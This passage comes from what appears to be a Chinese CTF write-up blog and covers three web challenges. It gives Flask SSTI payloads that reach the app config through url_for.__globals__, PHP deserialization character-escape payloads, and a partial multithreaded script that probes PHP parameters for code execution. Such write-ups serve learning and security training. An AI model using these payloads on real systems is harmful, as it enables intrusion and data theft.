127.0.0.1</code></p><p>flag{bf368694-e93d-4ec1-ae3b-05c305f54eaa}</p><hr><h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span><span class="token comment">#从环境变量中获取 FLAG，并将其存储在 Flask 应用的配置中。os.environ.pop('FLAG') 会获取并移除环境变量中的 FLAG。</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine&gt;'</span><span class="token punctuation">)</span><span class="token comment">#这是一个动态的 URL 部分，其中 &lt;...&gt; 表示这是一个变量部分，path 是变量的类型，shrine 是变量的名称。path 类型表示这个变量可以匹配任意的路径，包括斜杠 /，也就是说它能捕获 /shrine/ 后面的任意字符串，并且会将捕获到的内容作为参数传递给对应的视图函数。</span><span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#将 some/path 作为参数传递给 shrine 变量。</span>    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span><span class="token comment">#普通的{{config}}或者{{self}}无法使用</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s    <span class="token comment">#join 是字符串对象的一个方法，用于将一个可迭代对象（如列表）中的元素用指定的字符串连接起来。这里使用空字符串 '' 作为连接符，将列表中的元素依次拼接成一个完整的字符串。</span> <span class="token comment">#列表推导式会遍历 blacklist 列表中的每个元素 c，并将其插入到 '{{% set {}=None%}}' 这个字符串模板中，生成一个新的字符串列表。</span><span class="token comment">#{{% ... %}} 是 Jinja2 模板的标签语法，用于在模板中执行 Python 代码。</span><span class="token comment">#set 是 Jinja2 模板中的一个语句，用于定义变量。</span><span class="token comment">#{} 是 Python 字符串格式化中的占位符，format(c) 会将 c 的值填充到这个占位符中。</span>    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://cloud.tencent.com/developer/article/2130787">一文了解SSTI和所有常见payload 以flask模板为例-腾讯云开发者社区-腾讯云</a></p><p>过滤了小括号</p><p>用python的内置函数</p><p><code>config.items</code> 一个类字典的对象 , 包含了所有应用程序的配置值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">#搜索app,发现current_app </span><span class="token comment">#在Flask中，current_app是代理对象，指向当前的app实例。</span><span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">#有FLAG</span><span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>get_flashed_messages<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但safe_jinja函数中的处理是，将config设置为None。因为在safe_jinja函数中，会将黑名单中的每个词（config和self）用这样的语句设置为None。所以在模板渲染的时候，config变量会被设置为None，而无法访问原来的config对象。</p><p>但current_app是另一个变量，可能没有被覆盖。比如，假设在模板中，我们可以访问到current_app，然后通过current_app.config来获取配置。这时候，虽然config变量被设置为None，但current_app的config属性可能依然存在。</p><hr><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span><span class="token class-name type-declaration">php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span><span class="token comment">#把数组元素组合为字符串</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#销毁会话</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#将 POST 请求中的所有参数提取到当前作用域中，使它们可以直接作为变量使用。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#存储在会话中</span><span class="token punctuation">}</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phpinfo</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4aa1149f0ed5bfab15fcf48cf2bdbc94.png"></p><p>d0g3_f1ag.php</p><blockquote><p>extract会把POST的参数变成当前作用域的变量，如果POST中有同名的变量，可能会覆盖已有的变量。例如，如果POST中有_SESSION参数，可能会被覆盖</p></blockquote><p>但是后面的 $_SESSION[‘img’]覆盖不了</p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107135706">PHP反序列化字符逃逸详解_php filter字符串溢出-CSDN博客</a></p><p>检测到’flag’等关键字就把其替换为空，那么就利用这一点，我们故意输入敏感字符，替换为空之后来实现字符逃逸。</p><p>img随便传，会被替换成base64(‘guest_img.png’)即’ZDBnM19mMWFnLnBocA==’</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span><span class="token class-name type-declaration">php</span><span class="token variable">$sessionData</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string single-quoted-string">'q'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'img'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'ZDBnM19mMWFnLnBocA=='</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'xaxa'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">';s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";i:0;i:1;'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$sessionData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"q"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xaxa"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string double-quoted-string">";i:0;i:1;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要覆盖<code>";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"xaxa";s:47:</code>总共56个字。</p><p>故用<code>flagflagflagflagflagflagflagflagflagflagflagflagflagflag</code>代</p><p>先<code>d0g3_f1ag.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"q"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">56</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flagflagflagflagflagflagflagflagflagflagflagflagflagflag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xaxa"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn<span class="token string double-quoted-string">";i:0;i:1;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>i:7;i:8</code>， i代表数字，7代表键，就是7，值也是数字，值为8，索引为7，值为8，以满足最前面<code>a:3:</code>中的3</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflagflagflagflagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>img<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>xaxa<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在<code>/d0g3_fllllllag</code>里</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflagflagflagflagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>img<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>xaxa<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"L2QwZzNfZmxsbGxsbGFn"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">}</span>flag<span class="token punctuation">{</span><span class="token number">656</span>ea1d3<span class="token operator">-</span>a8aa<span class="token operator">-</span><span class="token number">4</span>a62<span class="token operator">-</span><span class="token number">9</span>b02<span class="token operator">-</span><span class="token number">0</span>a58d00e7421<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><del>话说有些wp还有时效性什么的（</del></p><hr><h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p><code>cat '/home/kali/桌面/1/www.tar.gz'      </code></p><p>爆出来一堆php，真无敌了</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/23d98d2c9a93b3e8a0e0f0676e8b0c2d.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e1d0cf566f69b2cb3dc6a760d7d2a594.png"></p><p>都是这种形式的（</p><p>找一个存在的GET/POST传参叭</p><p><a href="https://www.jianshu.com/p/e52154188acc">python多线程-Semaphore(信号对象) - 简书</a></p><p>[<a href="https://blog.csdn.net/a3320315/article/details/102945940">强网杯 2019]高明的黑客(考察代码编写能力)-CSDN博客</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os  <span class="token comment"># os：用于操作文件和目录路径。</span><span class="token keyword">import</span> requests  <span class="token comment"># requests：发送HTTP请求。</span><span class="token keyword">import</span> re  <span class="token comment"># re：正则表达式匹配，用于提取参数。</span><span class="token keyword">import</span> threading  <span class="token comment"># threading：实现多线程并发。</span><span class="token keyword">import</span> time  <span class="token comment"># time：获取和处理时间信息。</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'开始时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 记录脚本启动时间。</span>s1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment"># 这儿设置最大的线程数.控制最大并发线程数为100，防止资源耗尽。</span><span class="token triple-quoted-string string">"""信号量是一种用于控制并发访问资源的同步原语。它本质上是一个计数器，在多线程编程里，信号量可以限制同时访问某个资源或者执行某段代码的线程数量。当一个线程想要访问受信号量保护的资源时，它需要先获取信号量；当线程使用完资源后，需要释放信号量，这样其他线程才有机会获取信号量并访问资源。"""</span>filePath <span class="token operator">=</span> <span class="token string">r"D:\phpstudy_pro\WWW\src"</span>os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>  <span class="token comment"># 改变当前的路径</span>requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">=</span> <span class="token number">5</span>  <span class="token comment"># 设置重连次数，防止线程数过高，断开连接.增强网络请求的健壮性。</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>  <span class="token comment"># 获取目录下所有文件</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># 设置连接活跃状态为False。禁用Keep-Alive以避免连接池问题。</span><span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 获取信号量，控制并发</span>    <span class="token triple-quoted-string string">"""信号量计数器大于 0：如果当前信号量的计数器大于 0，说明还有可用的资源，线程会成功获取信号量，同时信号量的计数器会减 1。例如，若初始计数器值为 100，一个线程成功获取信号量后，计数器变为 99。信号量计数器等于 0：如果当前信号量的计数器为 0，意味着已经没有可用的资源了，此时线程会被阻塞，进入等待状态，直到有其他线程释放信号量，使得计数器的值大于 0，该线程才有机会获取信号量并继续执行。"""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying   '</span> <span class="token operator">+</span> <span class="token builtin">file</span> <span class="token operator">+</span> <span class="token string">'     '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 打印日志：输出当前正在处理的文件和时间。</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment"># 打开php文件，提取所有的$_GET和$_POST的参数</span>        gets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 正则匹配：从PHP代码中提取所有$_GET['param']和$_POST[</span>        <span class="token comment"># 'param']的参数名。list() 函数可以确保结果是一个列表类型</span>        <span class="token triple-quoted-string string">"""re.findall() 是 re 模块中的一个函数，用于在字符串中查找所有匹配指定正则表达式的子字符串，并将这些匹配结果以列表的形式返回。它的基本语法是 re.findall(pattern,         string)，其中 pattern 是正则表达式，string 是要搜索的字符串"""</span>        posts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 所有的$_POST</span>    params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 所有的$_GET</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'hahahahahah';"</span>  <span class="token comment"># 为每个GET/POST参数赋值echo 'hahahahahah';，用于检测代码执行漏洞。如果参数值被直接执行，响应中会包含xxxxxx。</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'hahahahahah';"</span>    url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/src/'</span> <span class="token operator">+</span> <span class="token builtin">file</span>    req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>  <span class="token comment"># 一次性请求所有的GET和POST</span>    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 关闭请求  释放内存</span>    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    content <span class="token operator">=</span> req<span class="token punctuation">.</span>text    <span class="token comment"># print(content)</span>    <span class="token keyword">if</span> <span class="token string">"hahahahahah"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>  <span class="token comment"># 如果发现有可以利用的参数，继续筛选出具体的参数</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>  <span class="token comment"># 如果在GET参数中找到，flag=1，否则检查POST。</span>            req <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>                url <span class="token operator">+</span> <span class="token string">'?%s='</span> <span class="token operator">%</span> a <span class="token operator">+</span> <span class="token string">"echo 'hahahahahah';"</span><span class="token punctuation">)</span>  <span class="token comment"># %s 是一个占位符，会被变量 a 的值替换。http://127.0.0.1/src/your_file.php</span>            <span class="token comment"># ?param1=echo 'hahahahahah';</span>            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 关闭请求  释放内存</span>            <span class="token keyword">if</span> <span class="token string">"hahahahahah"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                flag <span class="token operator">=</span> <span class="token number">1</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>                req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span> <span class="token string">"echo 'hahahahahah';"</span><span class="token punctuation">}</span><span class="token 